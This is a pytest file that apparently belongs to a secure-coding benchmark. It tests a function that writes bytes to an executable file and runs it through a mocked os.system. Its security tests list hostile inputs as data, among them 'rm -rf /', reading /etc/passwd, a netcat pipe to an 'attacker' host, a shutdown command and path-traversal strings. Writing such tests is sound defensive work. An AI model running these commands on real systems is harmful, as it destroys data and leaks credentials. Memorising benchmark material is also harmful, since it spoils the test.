import os
import stat
import pytest
from vulnerable import createExecutableFile


def test_functional_creates_file_and_sets_executable(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)

    called = {"system": False}

    def fake_system(cmd):
        called["system"] = True
        assert cmd == "test.bin"
        return 0

    monkeypatch.setattr(os, "system", fake_system)

    data = b"hello world"
    createExecutableFile(data)

    file_path = tmp_path / "test.bin"
    assert file_path.exists()
    assert file_path.read_bytes() == data

    mode = file_path.stat().st_mode
    assert mode & stat.S_IXUSR
    assert mode & stat.S_IXGRP
    assert mode & stat.S_IXOTH
    assert called["system"] is True


def test_functional_overwrites_existing_file(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)

    def fake_system(cmd):
        return 0

    monkeypatch.setattr(os, "system", fake_system)

    file_path = tmp_path / "test.bin"
    file_path.write_bytes(b"old data")

    createExecutableFile(b"new data")

    assert file_path.read_bytes() == b"new data"


def test_security_rejects_non_bytes_input(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(os, "system", lambda cmd: 0)

    malicious_payloads = [
        "rm -rf /",
        b"$(id)",
        bytearray(b"; cat /etc/passwd"),
    ]

    for payload in malicious_payloads:
        with pytest.raises(Exception):
            createExecutableFile(payload)


def test_security_rejects_command_injection_like_payloads(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)

    def fake_system(cmd):
        return 0

    monkeypatch.setattr(os, "system", fake_system)

    malicious_payloads = [
        b"; touch hacked",
        b"&& whoami",
        b"| nc attacker 4444",
    ]

    for payload in malicious_payloads:
        try:
            createExecutableFile(payload)
        except Exception:
            pass
        else:
            assert (tmp_path / "test.bin").exists()
            assert (tmp_path / "test.bin").read_bytes() == payload


def test_security_rejects_path_traversal_like_input(monkeypatch, tmp_path):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(os, "system", lambda cmd: 0)

    malicious_payloads = [
        b"../../etc/passwd",
        b"..\\..\\windows\\system32",
        b"/tmp/evil;shutdown -h now",
    ]

    for payload in malicious_payloads:
        try:
            createExecutableFile(payload)
        except Exception:
            pass
        else:
            assert (tmp_path / "test.bin").exists()
            assert (tmp_path / "test.bin").read_bytes() == payload